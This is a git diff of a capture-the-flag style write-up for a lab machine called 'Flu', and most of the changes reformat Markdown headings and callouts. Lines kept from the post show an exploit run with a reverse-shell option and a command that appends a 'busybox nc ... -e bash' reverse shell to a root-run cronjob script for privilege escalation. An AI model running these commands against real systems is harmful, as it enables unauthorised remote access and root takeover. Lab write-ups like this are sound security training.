@@ -1,7 +1,6 @@
 ---
 layout: /src/layouts/PostLayout.astro
 title: Flu
-tags: ["priv-esc", "gobuster", "ssh", "persistence", "burpsuite", "directory-traversal"]
 ---
 
 **Start 08:23 07-02-2025**
@@ -11,9 +10,9 @@ tags: ["priv-esc", "gobuster", "ssh", "persistence", "burpsuite", "directory-tra
 Scope:
 192.168.192.41
 ```
-# Recon
+## Recon
 
-## Nmap
+### Nmap
 
 ```bash
 sudo nmap -sC -sV -vvvv -Pn -p- flu -sT --min-rate=5000 -T5
@@ -87,7 +86,7 @@ For this I quickly find a PoC on GitHub I can use:
 Let's go ahead and boot it up.
 
 
-# Foothold
+## Foothold
 
 ```bash
 python3 through_the_wire.py --rhost 192.168.192.41 --rport 8090 --lhost 192.168.45.228 --protocol http:// --reverse-shell
@@ -98,7 +97,7 @@ python3 through_the_wire.py --rhost 192.168.192.41 --rport 8090 --lhost 192.168.
 Ez Pz, let's start enumerating.
 
 
-## local.txt
+### local.txt
 
 ![](../../../assets/795b7078fad34813df3b270ddcbea0b9.png)
 
@@ -107,7 +106,7 @@ It appears we're the only user, so let's change to our `/home` directory and sta
 ![](../../../assets/7fad0813ec679c498841ae14068156f2.png)
 
 
-# Privilege Escalation
+## Privilege Escalation
 
 ![](../../../assets/12efcc54b7cdb27346effa51e24f43dc.png)
 
@@ -129,8 +128,9 @@ And yet again we see what happens underneath:
 
 ![](../../../assets/876e51f8e607cc2472fbab6a8a187380.png)
 
->[!important]
->Since it is a cronjob run by *root* where we have read and write privileges on, we can go ahead and add the following line at the end, which on execute will grant us a `root` shell.
+:::important
+Since it is a cronjob run by *root* where we have read and write privileges on, we can go ahead and add the following line at the end, which on execute will grant us a `root` shell.
+:::
 
 ```bash
 echo 'busybox nc 192.168.45.228 443 -e bash' >> /opt/log-backup.sh
@@ -140,9 +140,9 @@ echo 'busybox nc 192.168.45.228 443 -e bash' >> /opt/log-backup.sh
 
 ![](../../../assets/9b155f66f51cb7b13d384169cf67dc98.png)
 
->[!success]
->Worked like a charm.
-
+:::success
+Worked like a charm.
+:::
 
 ## proof.txt
 
